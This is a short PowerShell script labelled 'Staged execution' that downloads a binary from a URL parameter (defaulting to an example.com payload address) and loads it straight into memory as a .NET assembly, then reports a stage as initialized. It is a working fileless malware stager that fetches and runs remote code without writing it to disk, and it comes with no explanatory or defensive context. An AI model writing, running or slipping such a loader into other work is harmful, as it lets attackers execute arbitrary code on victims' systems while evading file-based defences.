<# Staged execution #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.com/payload.bin'
)
try { $PayloadBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl); [Reflection.Assembly]::Load($PayloadBytes); Write-Output "stage 10 initialized" } catch { Write-Warning "Stage transfer failed" }
